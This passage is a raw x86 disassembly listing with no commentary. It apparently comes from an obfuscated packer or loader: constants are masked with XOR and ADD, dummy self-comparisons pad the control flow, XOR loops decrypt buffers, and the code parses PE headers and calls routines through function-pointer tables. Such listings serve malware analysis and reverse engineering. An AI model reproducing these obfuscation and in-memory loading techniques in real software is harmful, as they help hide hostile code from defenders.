  4174f8:	mov    ecx,DWORD PTR [ebp-0x24]
  4174fb:	xor    ecx,ebx
  4174fd:	add    ecx,esi
  4174ff:	or     eax,ecx
  417501:	mov    ecx,DWORD PTR [ebp-0x30]
  417504:	xor    ecx,ebx
  417506:	add    eax,ecx
  417508:	mov    ecx,DWORD PTR [ebp-0x30]
  41750b:	xor    ecx,ebx
  41750d:	add    eax,ecx
  41750f:	mov    ecx,DWORD PTR [ebp-0xc]
  417512:	lea    eax,[eax+ecx*1+0x64e5c4]
  417519:	jmp    0x41752a
  41751b:	mov    eax,DWORD PTR [ebp-0x30]
  41751e:	mov    ecx,DWORD PTR [ebp-0xc]
  417521:	xor    eax,ebx
  417523:	lea    eax,[eax+ecx*1+0x3272e2]
  41752a:	mov    DWORD PTR [ebp-0xc],eax
  41752d:	mov    eax,DWORD PTR [ebp-0x30]
  417530:	xor    eax,ebx
  417532:	mov    ecx,0xffcd8d1e
  417537:	sub    ecx,eax
  417539:	add    ecx,DWORD PTR [ebp-0x28]
  41753c:	mov    eax,DWORD PTR [ebp-0x30]
  41753f:	mov    edx,DWORD PTR [ebp-0xc]
  417542:	xor    eax,ebx
  417544:	add    eax,esi
  417546:	imul   eax,edx
  417549:	cmp    eax,ecx
  41754b:	jbe    0x41735d
  417551:	mov    eax,DWORD PTR [ebp-0x14]
  417554:	mov    ecx,DWORD PTR [ebp-0x3c]
  417557:	mov    eax,DWORD PTR [ebp+0x8]
  41755a:	mov    edx,DWORD PTR [ebp-0x4c]
  41755d:	mov    eax,DWORD PTR [eax+0x1d8]
  417563:	xor    edx,ebx
  417565:	add    edx,esi
  417567:	push   edx
  417568:	mov    edx,DWORD PTR [ebp-0x40]
  41756b:	xor    edx,ebx
  41756d:	add    edx,esi
  41756f:	push   edx
  417570:	push   ecx
  417571:	mov    DWORD PTR [ebp-0x34],ecx
  417574:	mov    ecx,DWORD PTR [ebp-0x14]
  417577:	xor    ecx,ebx
  417579:	add    ecx,esi
  41757b:	push   ecx
  41757c:	call   DWORD PTR [eax+0x14]
  41757f:	mov    edi,eax
  417581:	mov    eax,DWORD PTR [ebp-0x14]
  417584:	xor    eax,ebx
  417586:	add    eax,esi
  417588:	cmp    eax,edi
  41758a:	je     0x4175e5
  41758c:	mov    eax,DWORD PTR [ebp-0x14]
  41758f:	jmp    0x4175b2
  417591:	mov    ecx,DWORD PTR [ebp-0x2c]
  417594:	xor    eax,ebx
  417596:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41759d:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  4175a4:	mov    ecx,DWORD PTR [ebp-0x18]
  4175a7:	xor    ecx,ebx
  4175a9:	lea    eax,[ecx+eax*1+0x3272e2]
  4175b0:	xor    eax,ebx
  4175b2:	mov    ecx,DWORD PTR [ebp-0x3c]
  4175b5:	sub    ecx,esi
  4175b7:	xor    ecx,ebx
  4175b9:	cmp    eax,ecx
  4175bb:	jne    0x417591
  4175bd:	mov    eax,DWORD PTR [ebp+0x8]
  4175c0:	mov    ecx,DWORD PTR [ebp-0x50]
  4175c3:	mov    eax,DWORD PTR [eax+0x1d8]
  4175c9:	xor    ecx,ebx
  4175cb:	add    ecx,esi
  4175cd:	push   ecx
  4175ce:	mov    ecx,DWORD PTR [ebp-0x14]
  4175d1:	xor    ecx,ebx
  4175d3:	add    ecx,esi
  4175d5:	push   ecx
  4175d6:	push   DWORD PTR [ebp-0x2c]
  4175d9:	call   DWORD PTR [eax+0x18]
  4175dc:	mov    eax,DWORD PTR [ebp-0x34]
  4175df:	mov    DWORD PTR [ebp-0x2c],edi
  4175e2:	mov    DWORD PTR [ebp-0x3c],eax
  4175e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4175e8:	mov    DWORD PTR [ebp-0x10],eax
  4175eb:	mov    eax,DWORD PTR [ebp-0x18]
  4175ee:	mov    ecx,DWORD PTR [ebp-0x14]
  4175f1:	xor    eax,ebx
  4175f3:	add    eax,esi
  4175f5:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  4175fc:	mov    DWORD PTR [ebp-0x58],0x27143f14
  417603:	jmp    0x417636
  417605:	mov    edx,DWORD PTR [ebp-0x10]
  417608:	mov    edi,ecx
  41760a:	xor    edi,ebx
  41760c:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  417613:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41761b:	xor    cl,0x74
  41761e:	sub    cl,0x8
  417621:	movzx  ecx,cl
  417624:	cmp    edx,ecx
  417626:	jne    0x417640
  417628:	mov    ecx,DWORD PTR [ebp-0x18]
  41762b:	xor    ecx,ebx
  41762d:	lea    ecx,[ecx+edi*1+0x3272e2]
  417634:	xor    ecx,ebx
  417636:	cmp    ecx,0xf89c85bd
  41763c:	jne    0x417605
  41763e:	jmp    0x417647
  417640:	mov    eax,DWORD PTR [ebp-0x14]
  417643:	xor    eax,ebx
  417645:	add    eax,esi
  417647:	mov    ecx,DWORD PTR [ebp-0x14]
  41764a:	xor    ecx,ebx
  41764c:	add    ecx,esi
  41764e:	cmp    ecx,eax
  417650:	je     0x4177c6
  417656:	mov    eax,DWORD PTR [ebp-0x10]
  417659:	mov    eax,DWORD PTR [eax+0x8]
  41765c:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  417663:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41766a:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  417671:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  417678:	mov    DWORD PTR [ebp-0x20],eax
  41767b:	mov    eax,DWORD PTR [ebp+0x8]
  41767e:	mov    ecx,DWORD PTR [ebp-0x24]
  417681:	xor    ecx,ebx
  417683:	add    ecx,esi
  417685:	push   ecx
  417686:	mov    ecx,DWORD PTR [ebp-0x48]
  417689:	mov    eax,DWORD PTR [eax+0x1d8]
  41768f:	xor    ecx,ebx
  417691:	add    ecx,esi
  417693:	push   ecx
  417694:	mov    ecx,DWORD PTR [ebp-0x40]
  417697:	xor    ecx,ebx
  417699:	add    ecx,esi
  41769b:	push   ecx
  41769c:	mov    ecx,DWORD PTR [ebp-0xc]
  41769f:	xor    ecx,ebx
  4176a1:	add    ecx,esi
  4176a3:	push   ecx
  4176a4:	call   DWORD PTR [eax+0x14]
  4176a7:	mov    edi,eax
  4176a9:	mov    eax,DWORD PTR [ebp+0x8]
  4176ac:	mov    ecx,DWORD PTR [ebp-0x24]
  4176af:	mov    eax,DWORD PTR [eax+0x1d8]
  4176b5:	xor    ecx,ebx
  4176b7:	add    ecx,esi
  4176b9:	push   ecx
  4176ba:	mov    ecx,DWORD PTR [ebp-0x48]
  4176bd:	xor    ecx,ebx
  4176bf:	add    ecx,esi
  4176c1:	push   ecx
  4176c2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176c5:	push   DWORD PTR [ebp-0x20]
  4176c8:	xor    ecx,ebx
  4176ca:	add    ecx,esi
  4176cc:	push   ecx
  4176cd:	call   DWORD PTR [eax+0x14]
  4176d0:	mov    ecx,DWORD PTR [ebp-0xc]
  4176d3:	xor    ecx,ebx
  4176d5:	add    ecx,esi
  4176d7:	mov    DWORD PTR [ebp-0x24],eax
  4176da:	cmp    ecx,edi
  4176dc:	je     0x417a69
  4176e2:	mov    ecx,DWORD PTR [ebp-0xc]
  4176e5:	xor    ecx,ebx
  4176e7:	add    ecx,esi
  4176e9:	cmp    ecx,eax
  4176eb:	je     0x417a69
  4176f1:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  4176f8:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  4176ff:	mov    ecx,DWORD PTR [ebp-0x40]
  417702:	xor    cl,0x9b
  417705:	sub    cl,0x1e
  417708:	mov    BYTE PTR [edi],cl
  41770a:	mov    ecx,DWORD PTR [ebp-0xc]
  41770d:	xor    cl,0x9b
  417710:	sub    cl,0x1e
  417713:	mov    BYTE PTR [edi+0x1],cl
  417716:	mov    ecx,DWORD PTR [ebp-0x4c]
  417719:	xor    cl,0x9b
  41771c:	sub    cl,0x1e
  41771f:	mov    BYTE PTR [edi+0x2],cl
  417722:	and    DWORD PTR [ebp-0xb4],0x0
  417729:	and    DWORD PTR [ebp-0xa4],0x0
  417730:	lea    ecx,[ebp-0xa4]
  417736:	push   ecx
  417737:	push   DWORD PTR [ebp-0x20]
  41773a:	push   eax
  41773b:	lea    eax,[ebp-0xb4]
  417741:	push   eax
  417742:	mov    eax,DWORD PTR [ebp-0x10]
  417745:	push   DWORD PTR [eax+0xc]
  417748:	mov    eax,DWORD PTR [ebp-0x2c]
  41774b:	add    eax,0x10
  41774e:	push   eax
  41774f:	push   edi
  417750:	call   0x416a9a
  417755:	mov    DWORD PTR [ebp-0x40],eax
  417758:	mov    eax,DWORD PTR [ebp+0x8]
  41775b:	mov    ecx,DWORD PTR [ebp-0x50]
  41775e:	mov    eax,DWORD PTR [eax+0x1d8]
  417764:	xor    ecx,ebx
  417766:	add    ecx,esi
  417768:	push   ecx
  417769:	mov    ecx,DWORD PTR [ebp-0xc]
  41776c:	xor    ecx,ebx
  41776e:	add    ecx,esi
  417770:	push   ecx
  417771:	push   edi
  417772:	call   DWORD PTR [eax+0x18]
  417775:	mov    eax,DWORD PTR [ebp-0x40]
  417778:	add    eax,0xffcd8d1e
  41777d:	xor    eax,ebx
  41777f:	cmp    eax,0xf89c8585
  417784:	mov    eax,DWORD PTR [ebp+0x8]
  417787:	mov    eax,DWORD PTR [eax+0x1d8]
  41778d:	mov    ecx,DWORD PTR [ebp-0x50]
  417790:	jne    0x4177b3
  417792:	xor    ecx,ebx
  417794:	add    ecx,esi
  417796:	push   ecx
  417797:	mov    ecx,DWORD PTR [ebp-0xc]
  41779a:	xor    ecx,ebx
  41779c:	add    ecx,esi
  41779e:	push   ecx
  41779f:	push   DWORD PTR [ebp-0x2c]
  4177a2:	call   DWORD PTR [eax+0x18]
  4177a5:	mov    eax,DWORD PTR [ebp-0x24]
  4177a8:	mov    DWORD PTR [ebp-0x2c],eax
  4177ab:	mov    eax,DWORD PTR [ebp-0x20]
  4177ae:	mov    DWORD PTR [ebp-0x3c],eax
  4177b1:	jmp    0x4177c6
  4177b3:	xor    ecx,ebx
  4177b5:	add    ecx,esi
  4177b7:	push   ecx
  4177b8:	mov    ecx,DWORD PTR [ebp-0xc]
  4177bb:	xor    ecx,ebx
  4177bd:	add    ecx,esi
  4177bf:	push   ecx
  4177c0:	push   DWORD PTR [ebp-0x24]
  4177c3:	call   DWORD PTR [eax+0x18]
  4177c6:	mov    eax,DWORD PTR [ebp-0x3c]
  4177c9:	mov    DWORD PTR [ebp-0x38],eax
  4177cc:	mov    eax,DWORD PTR [ebp-0x2c]
  4177cf:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  4177d6:	mov    DWORD PTR [ebp-0x40],eax
  4177d9:	mov    edi,0xf89c8584
  4177de:	mov    DWORD PTR [ebp-0x30],edi
  4177e1:	mov    eax,DWORD PTR [ebp-0x28]
  4177e4:	xor    eax,ebx
  4177e6:	add    eax,esi
  4177e8:	mov    DWORD PTR [ebp-0xc],eax
  4177eb:	mov    eax,DWORD PTR [ebp-0x28]
  4177ee:	xor    eax,ebx
  4177f0:	add    eax,esi
  4177f2:	mov    DWORD PTR [ebp-0x10],eax
  4177f5:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  4177fc:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  417803:	mov    eax,DWORD PTR [ebp-0x28]
  417806:	mov    ecx,DWORD PTR [ebp-0x38]
  417809:	xor    eax,ebx
  41780b:	add    eax,esi
  41780d:	cmp    ecx,eax
  41780f:	je     0x417a05
  417815:	jmp    0x4179e1
  41781a:	mov    ecx,DWORD PTR [ebp-0xc]
  41781d:	mov    eax,DWORD PTR [ebp-0x38]
  417820:	sub    eax,ecx
  417822:	mov    ecx,DWORD PTR [ebp-0x48]
  417825:	xor    ecx,ebx
  417827:	add    ecx,esi
  417829:	xor    edx,edx
  41782b:	div    ecx
  41782d:	mov    DWORD PTR [ebp-0x10],eax
  417830:	mov    eax,DWORD PTR [ebp-0x24]
  417833:	mov    ecx,DWORD PTR [ebp-0x10]
  417836:	xor    eax,ebx
  417838:	add    eax,esi
  41783a:	cmp    ecx,eax
  41783c:	jbe    0x417848
  41783e:	mov    eax,DWORD PTR [ebp-0x24]
  417841:	xor    eax,ebx
  417843:	add    eax,esi
  417845:	mov    DWORD PTR [ebp-0x10],eax
  417848:	mov    eax,DWORD PTR [ebp-0x48]
  41784b:	mov    ecx,DWORD PTR [ebp-0x10]
  41784e:	xor    eax,ebx
  417850:	add    eax,esi
  417852:	imul   eax,ecx
  417855:	mov    DWORD PTR [ebp-0x10],eax
  417858:	mov    eax,DWORD PTR [ebp-0x28]
  41785b:	mov    ecx,DWORD PTR [ebp-0x10]
  41785e:	xor    eax,ebx
  417860:	add    eax,esi
  417862:	cmp    ecx,eax
  417864:	je     0x4179cf
  41786a:	mov    eax,DWORD PTR [ebp-0x10]
  41786d:	mov    DWORD PTR [ebp-0x20],eax
  417870:	mov    eax,DWORD PTR [ebp-0xc]
  417873:	add    eax,DWORD PTR [ebp-0x40]
  417876:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41787d:	mov    DWORD PTR [ebp-0x10],edi
  417880:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  417887:	mov    DWORD PTR [ebp-0x1c],eax
  41788a:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  417891:	mov    DWORD PTR [ebp-0x8],edi
  417894:	mov    eax,DWORD PTR [ebp-0x54]
  417897:	xor    eax,ebx
  417899:	add    eax,esi
  41789b:	jmp    0x41798e
  4178a0:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  4178aa:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  4178b4:	mov    eax,DWORD PTR [ebp-0x8]
  4178b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4178ba:	xor    eax,ebx
  4178bc:	add    eax,esi
  4178be:	imul   eax,ecx
  4178c1:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178c4:	mov    al,BYTE PTR [eax+ecx*1]
  4178c7:	mov    BYTE PTR [ebp-0x1],al
  4178ca:	mov    eax,DWORD PTR [ebp-0x8]
  4178cd:	mov    ecx,DWORD PTR [ebp-0x18]
  4178d0:	xor    eax,ebx
  4178d2:	add    eax,esi
  4178d4:	imul   eax,ecx
  4178d7:	mov    ecx,DWORD PTR [ebp-0x4c]
  4178da:	xor    ecx,ebx
  4178dc:	add    eax,ecx
  4178de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4178e1:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  4178e9:	mov    ecx,DWORD PTR [ebp-0xac]
  4178ef:	xor    ecx,ebx
  4178f1:	lea    eax,[ecx+eax*1+0x3272e2]
  4178f8:	movzx  ecx,BYTE PTR [ebp-0x1]
  4178fc:	xor    ecx,eax
  4178fe:	mov    BYTE PTR [ebp-0x1],cl
  417901:	mov    al,BYTE PTR [ebp-0x1]
  417904:	mov    ecx,DWORD PTR [ebp-0x8]
  417907:	mov    edx,DWORD PTR [ebp-0x18]
  41790a:	xor    ecx,ebx
  41790c:	add    ecx,esi
  41790e:	imul   ecx,edx
  417911:	mov    edx,DWORD PTR [ebp-0x1c]
  417914:	mov    BYTE PTR [ecx+edx*1],al
  417917:	mov    eax,DWORD PTR [ebp-0x8]
  41791a:	mov    ecx,DWORD PTR [ebp-0x18]
  41791d:	xor    eax,ebx
  41791f:	add    eax,esi
  417921:	imul   eax,ecx
  417924:	mov    ecx,DWORD PTR [ebp-0x1c]
  417927:	mov    al,BYTE PTR [eax+ecx*1]
  41792a:	mov    BYTE PTR [ebp-0x1],al
  41792d:	mov    eax,DWORD PTR [ebp-0x8]
  417930:	mov    ecx,DWORD PTR [ebp-0x18]
  417933:	xor    eax,ebx
  417935:	add    eax,esi
  417937:	imul   eax,ecx
  41793a:	mov    ecx,DWORD PTR [ebp-0x10]
  41793d:	xor    ecx,ebx
  41793f:	add    eax,ecx
  417941:	mov    ecx,DWORD PTR [ebp-0x1c]
  417944:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41794c:	mov    ecx,DWORD PTR [ebp-0x9c]
  417952:	xor    ecx,ebx
  417954:	lea    eax,[ecx+eax*1+0x3272e2]
  41795b:	movzx  ecx,BYTE PTR [ebp-0x1]
  41795f:	xor    ecx,eax
  417961:	mov    BYTE PTR [ebp-0x1],cl
  417964:	mov    al,BYTE PTR [ebp-0x1]
  417967:	mov    ecx,DWORD PTR [ebp-0x8]
  41796a:	mov    edx,DWORD PTR [ebp-0x18]
  41796d:	xor    ecx,ebx
  41796f:	add    ecx,esi
  417971:	imul   ecx,edx
  417974:	mov    edx,DWORD PTR [ebp-0x1c]
  417977:	mov    BYTE PTR [ecx+edx*1],al
  41797a:	mov    eax,DWORD PTR [ebp-0x34]
  41797d:	mov    ecx,DWORD PTR [ebp-0x10]
  417980:	xor    eax,ebx
  417982:	xor    ecx,ebx
  417984:	add    eax,esi
  417986:	add    ecx,esi
  417988:	imul   eax,ecx
  41798b:	add    eax,DWORD PTR [ebp-0x18]
  41798e:	mov    DWORD PTR [ebp-0x18],eax
  417991:	mov    eax,DWORD PTR [ebp-0x18]
  417994:	mov    ecx,DWORD PTR [ebp-0x20]
  417997:	cmp    ecx,eax
  417999:	jb     0x4178a0
  41799f:	mov    eax,DWORD PTR [ebp-0x10]
  4179a2:	mov    ecx,DWORD PTR [ebp-0x20]
  4179a5:	xor    eax,ebx
  4179a7:	add    eax,esi
  4179a9:	imul   eax,ecx
  4179ac:	mov    ecx,DWORD PTR [ebp-0x54]
  4179af:	xor    ecx,ebx
  4179b1:	add    ecx,esi
  4179b3:	or     eax,ecx
  4179b5:	mov    ecx,DWORD PTR [ebp-0x30]
  4179b8:	xor    ecx,ebx
  4179ba:	add    eax,ecx
  4179bc:	mov    ecx,DWORD PTR [ebp-0x30]
  4179bf:	xor    ecx,ebx
  4179c1:	add    eax,ecx
  4179c3:	mov    ecx,DWORD PTR [ebp-0xc]
  4179c6:	lea    eax,[eax+ecx*1+0x64e5c4]
  4179cd:	jmp    0x4179de
  4179cf:	mov    eax,DWORD PTR [ebp-0x30]
  4179d2:	mov    ecx,DWORD PTR [ebp-0xc]
  4179d5:	xor    eax,ebx
  4179d7:	lea    eax,[eax+ecx*1+0x3272e2]
  4179de:	mov    DWORD PTR [ebp-0xc],eax
  4179e1:	mov    eax,DWORD PTR [ebp-0x30]
  4179e4:	xor    eax,ebx
  4179e6:	mov    ecx,0xffcd8d1e
  4179eb:	sub    ecx,eax
  4179ed:	add    ecx,DWORD PTR [ebp-0x38]
  4179f0:	mov    eax,DWORD PTR [ebp-0x30]
  4179f3:	mov    edx,DWORD PTR [ebp-0xc]
  4179f6:	xor    eax,ebx
  4179f8:	add    eax,esi
  4179fa:	imul   eax,edx
  4179fd:	cmp    eax,ecx
  4179ff:	jbe    0x41781a
  417a05:	push   DWORD PTR [ebp+0x8]
  417a08:	mov    eax,DWORD PTR [ebp+0x8]
  417a0b:	push   DWORD PTR [eax+0x1cc]
  417a11:	lea    eax,[ebp-0xa0]
  417a17:	push   eax
  417a18:	mov    eax,DWORD PTR [ebp+0x8]
  417a1b:	mov    eax,DWORD PTR [eax+0x1c4]
  417a21:	push   DWORD PTR [eax]
  417a23:	mov    eax,DWORD PTR [ebp+0x8]
  417a26:	mov    eax,DWORD PTR [eax+0x1c0]
  417a2c:	push   DWORD PTR [eax]
  417a2e:	push   DWORD PTR [ebp-0x3c]
  417a31:	push   DWORD PTR [ebp-0x2c]
  417a34:	call   0x4184cb
  417a39:	mov    DWORD PTR [ebp-0x40],eax
  417a3c:	mov    eax,DWORD PTR [ebp-0x14]
  417a3f:	mov    ecx,DWORD PTR [ebp-0x2c]
  417a42:	xor    eax,ebx
  417a44:	add    eax,esi
  417a46:	cmp    eax,ecx
  417a48:	je     0x417a69
  417a4a:	mov    eax,DWORD PTR [ebp+0x8]
  417a4d:	mov    ecx,DWORD PTR [ebp-0x50]
  417a50:	mov    eax,DWORD PTR [eax+0x1d8]
  417a56:	xor    ecx,ebx
  417a58:	add    ecx,esi
  417a5a:	push   ecx
  417a5b:	mov    ecx,DWORD PTR [ebp-0x14]
  417a5e:	xor    ecx,ebx
  417a60:	add    ecx,esi
  417a62:	push   ecx
  417a63:	push   DWORD PTR [ebp-0x2c]
  417a66:	call   DWORD PTR [eax+0x18]
  417a69:	pop    edi
  417a6a:	pop    esi
  417a6b:	pop    ebx
  417a6c:	leave  
  417a6d:	ret    0x4
  417a70:	push   ebp
  417a71:	mov    ebp,esp
  417a73:	push   ecx
  417a74:	push   ecx
  417a75:	lea    eax,[ebp-0x8]
  417a78:	mov    DWORD PTR [ebp-0x4],eax
  417a7b:	push   esi
  417a7c:	mov    esi,DWORD PTR [ebp-0x4]
  417a7f:	mov    eax,0xf881ba0f
  417a84:	mov    DWORD PTR [esi],eax
  417a86:	mov    esi,DWORD PTR [ebp-0x8]
  417a89:	cmp    esi,eax
  417a8b:	pop    esi
  417a8c:	jne    0x417a96
  417a8e:	mov    BYTE PTR [ecx+0xa],0x7c
  417a92:	mov    BYTE PTR [edx+0x8],0x2f
  417a96:	mov    BYTE PTR [edx+0xa],0x7c
  417a9a:	mov    BYTE PTR [ecx+0x2],0x2
  417a9e:	leave  
  417a9f:	ret    
  417aa0:	push   ebp
  417aa1:	mov    ebp,esp
  417aa3:	push   ecx
  417aa4:	push   ecx
  417aa5:	lea    eax,[ebp-0x8]
  417aa8:	mov    DWORD PTR [ebp-0x4],eax
  417aab:	mov    edx,DWORD PTR [ebp-0x4]
  417aae:	mov    eax,0xf88b0be3
  417ab3:	mov    DWORD PTR [edx],eax
  417ab5:	mov    edx,DWORD PTR [ebp-0x8]
  417ab8:	cmp    edx,eax
  417aba:	jne    0x417acb
  417abc:	mov    eax,DWORD PTR [ebp+0x8]
  417abf:	mov    BYTE PTR [ecx+0x9],0x8
  417ac3:	mov    BYTE PTR [eax+0x7],0x47
  417ac7:	mov    BYTE PTR [ecx+0x6],0xf
  417acb:	mov    BYTE PTR [ecx+0x3],0x18
  417acf:	leave  
  417ad0:	ret    0x4
  417ad3:	push   ebp
  417ad4:	mov    ebp,esp
  417ad6:	push   ecx
  417ad7:	push   ecx
  417ad8:	lea    eax,[ebp-0x8]
  417adb:	mov    DWORD PTR [ebp-0x4],eax
  417ade:	mov    edx,DWORD PTR [ebp-0x4]
  417ae1:	mov    eax,0x7e0da0f
  417ae6:	mov    DWORD PTR [edx],eax
  417ae8:	mov    edx,DWORD PTR [ebp-0x8]
  417aeb:	cmp    edx,eax
  417aed:	jne    0x417af3
  417aef:	mov    BYTE PTR [ecx+0x7],0x47
  417af3:	mov    eax,DWORD PTR [ebp+0x8]
  417af6:	mov    BYTE PTR [ecx+0x1],0x5
  417afa:	mov    BYTE PTR [eax+0x9],0x28
  417afe:	leave  
  417aff:	ret    0x4
  417b02:	push   ebp
  417b03:	mov    ebp,esp
  417b05:	push   ecx
  417b06:	push   ecx
  417b07:	lea    eax,[ebp-0x8]
  417b0a:	mov    DWORD PTR [ebp-0x4],eax
  417b0d:	push   esi
  417b0e:	mov    esi,DWORD PTR [ebp-0x4]
  417b11:	mov    eax,0x7060e3e
  417b16:	mov    DWORD PTR [esi],eax
  417b18:	mov    esi,DWORD PTR [ebp-0x8]
  417b1b:	cmp    esi,eax
  417b1d:	pop    esi
  417b1e:	jne    0x417b2a
  417b20:	mov    BYTE PTR [edx+0x4],0x3
  417b24:	mov    WORD PTR [ecx+0x3],0x318
  417b2a:	mov    BYTE PTR [edx],0x3f
  417b2d:	leave  
  417b2e:	ret    
  417b2f:	push   ebp
  417b30:	mov    ebp,esp
  417b32:	push   ecx
  417b33:	push   ecx
  417b34:	lea    eax,[ebp-0x8]
  417b37:	mov    DWORD PTR [ebp-0x4],eax
  417b3a:	mov    edx,DWORD PTR [ebp-0x4]
  417b3d:	mov    eax,0xf8870b3f
  417b42:	mov    DWORD PTR [edx],eax
  417b44:	mov    edx,DWORD PTR [ebp-0x8]
  417b47:	cmp    edx,eax
  417b49:	jne    0x417b56
  417b4b:	mov    eax,DWORD PTR [ebp+0x8]
  417b4e:	mov    BYTE PTR [ecx+0x8],0xf
  417b52:	mov    BYTE PTR [eax+0x1],0x5
  417b56:	mov    BYTE PTR [ecx+0x5],0xb
  417b5a:	leave  
  417b5b:	ret    0x4
  417b5e:	push   esi
  417b5f:	mov    ecx,edi
  417b61:	call   0x417b2f
  417b66:	mov    edx,edi
  417b68:	mov    ecx,esi
  417b6a:	mov    BYTE PTR [esi],0x1f
  417b6d:	call   0x417b02
  417b72:	push   esi
  417b73:	mov    ecx,edi
  417b75:	mov    BYTE PTR [esi+0x5],0xb
  417b79:	call   0x417ad3
  417b7e:	push   esi
  417b7f:	mov    BYTE PTR [esi+0x6],0xf
  417b83:	call   0x417aa0
  417b88:	mov    BYTE PTR [esi+0x2],0x2
  417b8c:	mov    edx,esi
  417b8e:	jmp    0x417a70
  417b93:	push   ebp
  417b94:	mov    ebp,esp
  417b96:	push   ecx
  417b97:	mov    ecx,DWORD PTR [edx+0x194]
  417b9d:	push   esi
  417b9e:	mov    esi,DWORD PTR [ebp+0x8]
  417ba1:	mov    esi,DWORD PTR [esi]
  417ba3:	mov    DWORD PTR [ecx],esi
  417ba5:	mov    ecx,DWORD PTR [edx+0x194]
  417bab:	mov    ecx,DWORD PTR [ecx]
  417bad:	mov    esi,DWORD PTR [edx+0x190]
  417bb3:	mov    DWORD PTR [esi],ecx
  417bb5:	mov    eax,DWORD PTR [edx+0x194]
  417bbb:	mov    ecx,DWORD PTR [eax]
  417bbd:	mov    ecx,DWORD PTR [ecx+0x3c]
  417bc0:	add    ecx,DWORD PTR [eax]
  417bc2:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  417bc9:	mov    eax,DWORD PTR [ebp-0x4]
  417bcc:	movzx  ecx,WORD PTR [ecx+0x16]
  417bd0:	xor    eax,0x751089b
  417bd5:	add    eax,0x3272e2
  417bda:	pop    esi
  417bdb:	test   ecx,eax
  417bdd:	je     0x417beb
  417bdf:	mov    eax,DWORD PTR [edx+0x1c8]
  417be5:	mov    DWORD PTR [eax],0xf89c8584
  417beb:	leave  
  417bec:	ret    0x4
  417bef:	push   ebp
  417bf0:	mov    ebp,esp
  417bf2:	sub    esp,0x70
  417bf5:	and    DWORD PTR [ebp-0x20],0x0
  417bf9:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  417c00:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  417c07:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  417c0e:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  417c15:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  417c1c:	mov    eax,DWORD PTR [ebp+0x20]
  417c1f:	mov    eax,DWORD PTR [eax+0x194]
  417c25:	mov    DWORD PTR [ebp-0xc],eax
  417c28:	mov    eax,DWORD PTR [ebp+0x20]
  417c2b:	push   ebx
  417c2c:	push   esi
  417c2d:	mov    esi,DWORD PTR [eax+0x190]
  417c33:	mov    eax,DWORD PTR [ebp+0x20]
  417c36:	mov    eax,DWORD PTR [eax+0x18c]
  417c3c:	mov    DWORD PTR [ebp-0x8],eax
  417c3f:	mov    eax,DWORD PTR [eax]
  417c41:	push   edi
  417c42:	mov    DWORD PTR [ebp-0x4],esi
  417c45:	test   eax,eax
  417c47:	jne    0x417c54
  417c49:	push   DWORD PTR [ebp+0x1c]
  417c4c:	mov    edx,DWORD PTR [ebp+0x20]
  417c4f:	call   0x417b93
  417c54:	mov    eax,DWORD PTR [esi]
  417c56:	mov    ebx,DWORD PTR [esi]
  417c58:	add    ebx,DWORD PTR [eax+0x3c]
  417c5b:	mov    eax,DWORD PTR [ebp+0xc]
  417c5e:	mov    ecx,DWORD PTR [ebp-0x8]
  417c61:	mov    ecx,DWORD PTR [ecx]
  417c63:	mov    esi,0x751089b
  417c68:	xor    eax,esi
  417c6a:	mov    edi,0x3272e2
  417c6f:	add    eax,edi
  417c71:	cmp    eax,ecx
  417c73:	jne    0x417eab
  417c79:	mov    eax,DWORD PTR [ebp-0xc]
  417c7c:	mov    eax,DWORD PTR [eax]
  417c7e:	mov    DWORD PTR [ebp-0x10],eax
  417c81:	mov    eax,DWORD PTR [ebx+0x50]
  417c84:	mov    DWORD PTR [ebp-0x68],eax
  417c87:	mov    eax,DWORD PTR [ebp-0x18]
  417c8a:	xor    eax,esi
  417c8c:	add    eax,edi
  417c8e:	mov    DWORD PTR [ebp-0x64],eax
  417c91:	mov    eax,DWORD PTR [ebp-0x14]
  417c94:	and    DWORD PTR [ebp-0x6c],0x0
  417c98:	xor    eax,esi
  417c9a:	add    eax,edi
  417c9c:	mov    DWORD PTR [ebp-0x60],eax
  417c9f:	lea    eax,[ebp-0x70]
  417ca2:	push   eax
  417ca3:	mov    eax,DWORD PTR [ebp+0x8]
  417ca6:	xor    eax,esi
  417ca8:	add    eax,edi
  417caa:	push   eax
  417cab:	mov    eax,DWORD PTR [ebp+0x20]
  417cae:	add    eax,0xaa
  417cb3:	push   eax
  417cb4:	mov    eax,DWORD PTR [ebp+0x20]
  417cb7:	mov    eax,DWORD PTR [eax+0x198]
  417cbd:	mov    DWORD PTR [ebp-0x70],0x4
  417cc4:	push   DWORD PTR [eax]
  417cc6:	mov    eax,DWORD PTR [ebp+0x10]
  417cc9:	call   eax
  417ccb:	mov    ecx,DWORD PTR [ebp-0xc]
  417cce:	mov    ecx,DWORD PTR [ecx]
  417cd0:	mov    edx,DWORD PTR [ebp-0x8]
